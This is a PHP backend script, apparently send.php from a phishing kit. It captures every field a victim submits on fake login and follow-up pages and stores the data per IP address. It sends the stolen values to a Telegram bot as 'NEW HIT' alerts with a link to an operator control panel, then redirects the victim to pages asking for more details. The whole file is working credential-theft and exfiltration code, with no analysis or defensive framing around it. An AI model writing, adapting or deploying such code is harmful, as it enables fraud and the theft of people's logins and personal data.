<?php
error_reporting(0);
@session_start();


if (file_exists('config.php')) {
    include 'config.php';
} else {
    $bot_token = ""; 
    $chat_id = "";   
}


function get_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'];
}

$ip = get_ip();
$date = date("H:i:s | d-m-Y");
$captured_data = $_POST;



$current_step = isset($_POST['step']) ? $_POST['step'] : 'login';


$status_file = "status_$ip.json"; 
if (file_exists($status_file)) {
    $current_data = json_decode(file_get_contents($status_file), true);
} else {
    $current_data = ['ip' => $ip, 'results' => []];
}

$current_data['action'] = "waiting"; 
$current_data['last_seen'] = time();

if (!empty($captured_data)) {
    $new_res = ["time" => $date, "step_name" => $current_step];
    foreach($captured_data as $k => $v) {
        if($k != 'extra_check_field' && $k != 'step' && !empty($v)) {
            $new_res[$k] = $v;
        }
    }
    $current_data['results'][] = $new_res;
}
file_put_contents($status_file, json_encode($current_data));


$msg = "🚀 <b>NEW HIT - STEP: [" . strtoupper($current_step) . "]</b>\n";
$msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
foreach ($captured_data as $k => $v) {
    if(!empty($v) && $k != 'extra_check_field' && $k != 'step'){
        $label = strtoupper(str_replace('_', ' ', $k));
        $msg .= "🔹 <b>$label:</b> <code>$v</code>\n";
    }
}
$msg .= "━━━━━━━━━━━━━━━━━━━━\n📅 $date";


$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$project_root = str_replace('/core/send.php', '', $_SERVER['SCRIPT_NAME']);
$panel_url = $protocol . "://" . $host . $project_root . "/panel/panel.php";

$keyboard = ['inline_keyboard' => [[['text' => '🎮 OPEN PANEL', 'url' => $panel_url . "?target=" . $ip]]]];


function send_tg($token, $id, $text, $kb) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = http_build_query(['chat_id' => $id, 'text' => $text, 'parse_mode' => 'HTML', 'reply_markup' => json_encode($kb)]);
    $opts = ["http" => ["method" => "POST", "header" => "Content-Type: application/x-www-form-urlencoded\r\n", "content" => $data, "timeout" => 8], "ssl" => ["verify_peer" => false, "verify_peer_name" => false]];
    return @file_get_contents($url, false, stream_context_create($opts));
}

if (!empty($bot_token)) {
    send_tg($bot_token, $chat_id, $msg, $keyboard);
}



if ($current_step == 'login') {
	
    header("Location: ../dob.php?ip=$ip");
} 

 elseif ($current_step == 'www') {
	
    header("Location: ../wait.php?ip=$ip");
} 

exit();
?>